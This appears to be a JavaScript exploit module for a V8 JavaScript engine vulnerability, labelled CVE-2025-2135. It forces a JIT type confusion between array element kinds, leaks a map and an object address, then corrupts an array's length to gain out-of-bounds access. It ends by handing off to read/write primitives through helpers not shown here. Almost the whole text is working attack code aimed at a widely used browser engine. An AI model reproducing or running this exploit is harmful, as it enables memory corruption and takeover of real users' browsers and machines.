function a1(map, params, cb) {
    function main(mapprops, elementslength) {
        function f0(v2, v3, mapprops, elementslength) {
            // TransitionElementsKindOrCheckMap: PACKED_SMI -> HOLEY_DOUBLE_ELEMENTS
            var v4 = v3[0];
            
            // TransitionElementsKindOrCheckMap: HOLEY_DOUBLE_ELEMENTS -> HOLEY_ELEMENTS
            var v5 = v2[0];
    
            // If v2 == v3, v3 doesn't have HOLEY_DOUBLE_ELEMENTS anymore.
            Array.prototype.push.call(v3, mapprops, elementslength, elementslength);
        }
        
        const holey = new Array(1);
        holey[0] = 'tagged';

        // %PrepareFunctionForOptimization(f0);
        // f0(holey, [1], 1.1);
        for (let x = 0; x < 10e5; x++) {
            f0(holey, [1], 1.1, 1.2);
        }
    
        const holey_double = new Array(8);
        holey_double.fill(1.1);
        holey_double.pop();
        holey_double.pop();
        holey_double.pop();
    
        // %OptimizeFunctionOnNextCall(f0);
        f0(holey_double, holey_double, mapprops, elementslength);

        // %DebugPrint(holey_double);
        return holey_double[1];
    }
    main(itof((params[0] << 32n) | map), 0);
    let obj = main(itof((map << 32n) | map), itof((params[1] << 32n) | params[0]));
    let arr1 = [2.2, 2.2, 2.2];
    let arr2 = [oobarr, oobarr, oobarr, oobarr, oobarr, oobarr];
    
    return (cb || ((o) => o))(obj);
}



export async function execute(version) {
    await console.log('Executing CVE-2025-2135');


    let packed_double_map;
    let oobarrAddr;
    let leak = a1(0x0000053dn, [0x00000080n, 0x00000080n], (obj) => {
        let output = new Array(0x20).fill(1.1);
        for (let x = 0; x < output.length; x++) {
            output[x] = obj & 0xffffffffffffffffn;
            obj >>= 64n;
        }
        return output
    });
    for (let i = 0; i < leak.length; i++) {
        if (leak[i - 1] == 0x400199999999999an && leak[i] != 0x400199999999999an) {
            packed_double_map = leak[i] & 0xffffffffn;
        }
        if (leak[i] == leak[i - 1]) {
            if ((leak[i] >> 32n) == (leak[i] & 0xffffffffn)) {
                oobarrAddr = leak[i] & 0xffffffffn;
                break;
            }
        }
    }
    console.log('packed_double_map:', to_hex(packed_double_map));
    console.log('oobarr_addr:', to_hex(oobarrAddr));

    let _oobarr = a1(packed_double_map, [packed_double_map, oobarrAddr]);
    _oobarr[0] = itof(0x0001000000000000n | (ftoi(_oobarr[0]) & 0xffffffffn));
    if (oobarr.length == 3) throw new Error('Failed to corrupt oobarr');

    return scan_primitives(oobarr, objarr, crwarr);
}